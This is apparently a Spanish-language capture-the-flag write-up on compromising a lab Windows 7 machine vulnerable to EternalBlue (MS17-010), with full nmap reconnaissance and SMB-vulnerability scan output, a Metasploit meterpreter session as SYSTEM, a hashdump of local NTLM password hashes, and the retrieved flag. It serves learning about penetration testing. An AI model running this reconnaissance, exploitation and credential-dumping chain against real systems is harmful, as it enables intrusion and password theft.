Parte de [[Maquinas]]

Maquina en Windows 7 vulnerable a Eternal Blue (exploit de SMBv1 que da permisos NT-AUTHORITY)

``` java
sudo nmap -sn 192.168.56.100/24 -oN arpsweep.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 17:57 CET
Nmap scan report for 192.168.56.1
Host is up (0.00021s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.10
Host is up (0.00024s latency).
MAC Address: 08:00:27:BD:E2:E7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.108
Host is up (0.00068s latency).
MAC Address: 08:00:27:31:EF:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds
```

Enumeramos los puertos:

``` java
sudo nmap -sS -A -T4 192.168.56.108 -oN nmap.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 17:58 CET
Nmap scan report for 192.168.56.108
Host is up (0.00076s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:31:EF:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: Host: MIKE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:31:ef:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-13T17:59:40+01:00
|_clock-skew: mean: -20m01s, deviation: 34m38s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-13T16:59:40
|_  start_date: 2025-03-13T16:56:38

TRACEROUTE
HOP RTT     ADDRESS
1   0.76 ms 192.168.56.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.93 seconds
```

Lanzamos scripts de enumeracion de SMB:

``` java
sudo nmap --script smb* 192.168.56.108
set
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 18:02 CET
Nmap scan report for 192.168.56.108
Host is up (0.00026s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:31:EF:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-054: false
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-13T18:03:29+01:00
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-mbenum: 
|   Master Browser
|     MIKE-PC  6.1  
|   Potential Browser
|     MIKE-PC  6.1  
|   Server service
|     MIKE-PC  6.1  
|   Windows NT/2000/XP/2003 server
|     MIKE-PC  6.1  
|   Workstation
|_    MIKE-PC  6.1  
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
| smb-brute: 
|_  No accounts found
| smb2-time: 
|   date: 2025-03-13T17:02:24
|_  start_date: 2025-03-13T16:56:38
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_smb-print-text: false

Nmap done: 1 IP address (1 host up) scanned in 73.55 seconds
```

Utilizamos ms17_010 en metasploit y conseguimos una sesion de meterpreter como NT-AUTHORITY 

``` java
C:\Windows\system32>whoami
whoami
nt authority\system
C:\Windows\system32>EXIT

meterpreter > hashdump
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:bae41ca591dff9f200a0cb95dd636d60:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MIKE:1001:aad3b435b51404eeaad3b435b51404ee:49d1acab366daee51dcc3e9af958aced:::
```

Vemos la flag

``` java
meterpreter > search -f root.txt
Found 1 result...
=================

Path                            Size (bytes)  Modified (UTC)
----                            ------------  --------------
c:\Users\MIKE\Desktop\root.txt  35            2024-02-03 12:50:56 +0100

C:\Users\MIKE\Desktop>type root.txt
type root.txt
1682c7160e3855a6685316efb97ce451 
```